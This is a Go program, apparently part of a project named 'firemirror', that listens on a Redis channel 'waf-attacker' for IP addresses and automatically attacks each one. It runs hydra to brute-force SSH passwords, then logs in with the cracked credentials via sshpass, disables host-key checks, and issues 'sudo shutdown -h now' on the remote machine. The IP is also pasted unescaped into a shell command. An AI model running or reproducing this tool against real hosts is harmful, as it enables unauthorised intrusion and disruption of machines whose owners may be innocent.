package main

import (
	"firemirror/attacker/models"

	"fmt"
	"os/exec"
	"regexp"
	"sync"

	"github.com/go-redis/redis/v8"
	"golang.org/x/net/context"
)

const maxConcurrentAttacks = 5

func attack(wg *sync.WaitGroup, sem chan struct{}) {
	defer wg.Done()
	defer func() { <-sem }()

	now_attack_list, err := models.GetWaitingAttackList()
	if err != nil {
		fmt.Println(err)
		return
	}
	now_attack_list.Status = "Attacking"
	now_attack_list.Update()
	fmt.Println(now_attack_list)
	ip := now_attack_list.IP
	cmd := exec.Command("sh", "-c", "hydra -l ubuntu -P password.lst "+ip+" ssh")
	output, err := cmd.Output()
	if err != nil {
		fmt.Println(err)
		now_attack_list.Status = "Failed"
		now_attack_list.Update()
		return
	}
	fmt.Println(string(output))
	re := regexp.MustCompile(`login: (\S+).*password: (\S+)`)
	matches := re.FindStringSubmatch(string(output))
	if len(matches) > 0 {
		fmt.Println("Login: ", matches[1])
		fmt.Println("Password: ", matches[2])
		cmd = exec.Command("sh", "-c", "sshpass -p "+matches[2]+" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -l "+matches[1]+" "+ip+" sh -c 'ls && echo 1q2w3e4r | sudo -S shutdown -h now'")
		output, err = cmd.Output()
		if err != nil {
			fmt.Println(err)
			now_attack_list.Status = "Failed"
		} else {
			fmt.Println(string(output))
			now_attack_list.Status = "Success"
		}
	} else {
		now_attack_list.Status = "Failed"
	}
	now_attack_list.Update()
}

func main() {
	models.Init()

	ctx := context.Background()

	rdb := redis.NewClient(&redis.Options{
		Addr: "redis:6379",
	})

	pubsub := rdb.Subscribe(ctx, "waf-attacker")
	defer pubsub.Close()

	ch := pubsub.Channel()

	var wg sync.WaitGroup
	sem := make(chan struct{}, maxConcurrentAttacks)

	for msg := range ch {
		fmt.Println("Received message:", msg.Payload)
		var attack_list models.AttackList
		attack_list.IP = msg.Payload
		attack_list.Status = "Waiting"
		attack_list.Insert()

		wg.Add(1)
		sem <- struct{}{}
		go attack(&wg, sem)
	}

	wg.Wait()
	fmt.Println("Subscriber exited")
}
